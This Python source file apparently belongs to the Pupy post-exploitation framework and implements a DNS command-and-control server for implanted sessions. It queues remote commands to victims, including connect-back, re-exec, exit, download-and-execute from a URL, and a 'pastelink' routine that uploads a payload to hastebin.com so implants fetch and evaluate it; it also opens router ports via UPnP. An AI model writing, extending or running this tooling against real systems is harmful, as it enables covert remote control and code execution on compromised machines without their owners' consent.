# -*- coding: utf-8 -*-
import logging
from PupyCredentials import Credentials
from network.lib.picocmd.server import *
from network.lib.picocmd.picocmd import *
from Queue import Queue

from pupylib.PupyConfig import PupyConfig
from pupylib.utils.network import get_listener_ip

import requests
import netifaces
import socket

from os import path

from network.lib.igd import IGDClient, UPNPError

class PupyDnsCommandServerHandler(DnsCommandServerHandler):
    def __init__(self, *args, **kwargs):
        DnsCommandServerHandler.__init__(self, *args, **kwargs)

    def connect(self, hosts, port, transport, node=None, default=False):
        commands = [
            Connect(host, port, transport) for host in hosts
        ]

        applied = 0
        for command in commands:
            applied = self.add_command(command, session=node, default=default)

        return applied

    def disconnect(self, node=None, default=False):
        return self.add_command(Disconnect(), session=node, default=default)

    def reexec(self, node=None, default=False):
        return self.add_command(Reexec(), session=node, default=default)

    def sleep(self, timeout, node=None, default=False):
        return self.add_command(Sleep(timeout), session=node, default=default)

    def exit(self, node=None, default=False):
        return self.add_command(Exit(), session=node, default=default)

    def dexec(self, url, action, proxy=False, node=None, default=None):
        return self.add_command(
            DownloadExec(url, action=action, proxy=proxy),
            session=node, default=default
        )

    def pastelink(self, url, action, node=None, default=None):
        return self.add_command(
            PasteLink(url, action=action),
            session=node, default=default
        )

class PupyDnsCnc(object):
    def __init__(
            self, domain, igd=None, connect_host=None,
            recursor='8.8.8.8', port=5353, listen='0.0.0.0',
            connect_transport='ssl', connect_port=443,
            config=None, credentials=None
        ):

        credentials = credentials or Credentials()
        config = config or PupyConfig()
        self.config = config

        connect_host = connect_host or config.getip('pupyd', 'address')

        self.igd = igd
        self.transport = connect_transport or config.get('pupyd', 'transport')
        self.port = int(connect_port  or config.getint('pupyd', 'port'))
        self.host = connect_host if connect_host else get_listener_ip(
            external=True, config=config, igd=igd
        )
        if self.host:
            self.host = [ str(self.host) ]

        self.dns_domain = domain
        self.dns_port = port
        self.dns_listen = listen
        self.dns_recursor = recursor
        self.handler = PupyDnsCommandServerHandler(
            domain,
            credentials['DNSCNC_PRIV_KEY'],
            recursor=recursor
        )

        self.server = DnsCommandServer(
            self.handler,
            address=listen,
            port=int(port)
        )

        if self.igd and self.igd.available:
            self.igd.AddPortMapping(int(port), 'UDP', 53)
            self.igd.AddPortMapping(int(port), 'TCP', 53)

        self.server.start()

    def stop(self):
        self.server.stop()

    def list(self, node=None):
        return [ session for session in self.handler.find_sessions(node=node) ]

    def connect(self, host=None, port=None, transport=None, node=None, default=False):
        return self.handler.connect(
            self.host if host is None else [ host ],
            self.port if port is None else port,
            self.transport if transport is None else transport,
            node=node,
            default=default
        )

    def disconnect(self, **kwargs):
        return self.handler.disconnect(**kwargs)

    def exit(self, **kwargs):
        return self.handler.exit(**kwargs)

    def sleep(self, *args, **kwargs):
        return self.handler.sleep(*args, **kwargs)

    def reexec(self, **kwargs):
        return self.handler.reexec(**kwargs)

    def reset(self, **kwargs):
        return self.handler.reset_commands(**kwargs)

    def dexec(self, *args, **kwargs):
        return self.handler.dexec(*args, **kwargs)

    def pastelink(self, content=None, url=None, action='pyeval', node=None, default=False):
        if not ( content or url ):
            raise ValueError('content and url args are empty')

        if content and url:
            raise ValueError('both content and url are selected')

        if content:
            content_path = path.expanduser(path.expandvars(content))
            if not path.exists(content_path):
                raise ValueError('no such file: {}'.format(content_path))

            payload = b''
            # TODO: add more providers
            with open(content_path) as content:
                payload = self.handler.encode_pastelink_content(content.read())

            response = requests.post('https://hastebin.com/documents', data=payload)
            if response.ok:
                key = response.json()['key']
                url = 'https://hastebin.com/raw/{}'.format(key)

        if not url:
            raise ValueError('couldn\'t create pastelink url')

        count = self.handler.pastelink(url, action, node=node, default=default)
        return count, url

    @property
    def policy(self):
        return {
            'interval': self.handler.interval,
            'timeout': self.handler.timeout,
            'kex': self.handler.kex,
        }

    def set_policy(self, *args, **kwargs):
        return self.handler.set_policy(*args, **kwargs)

    @property
    def dirty(self):
        count = 0
        for session in self.handler.find_sessions():
            if session.commands:
                count += 1
        return count

    @property
    def count(self):
        return len(self.handler.sessions)

    @property
    def commands(self):
        return self.handler.commands
